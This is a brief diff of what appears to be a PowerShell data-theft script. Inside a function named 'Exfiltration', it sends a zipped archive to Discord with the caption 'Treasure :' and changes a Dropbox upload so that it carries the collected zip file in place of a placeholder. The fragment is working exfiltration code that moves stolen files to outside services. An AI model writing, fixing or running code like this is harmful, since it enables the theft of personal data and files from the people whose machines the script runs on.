@@ -128,7 +128,7 @@ function Exfiltration {
     Upload-Discord -file $zipFilePath -text "Treasure :"
 
     # Call Upload-Dropbox
-    Upload-Dropbox -FileName "file.txt"
+    Upload-Dropbox -FileName $zipFileName
     
 }
 
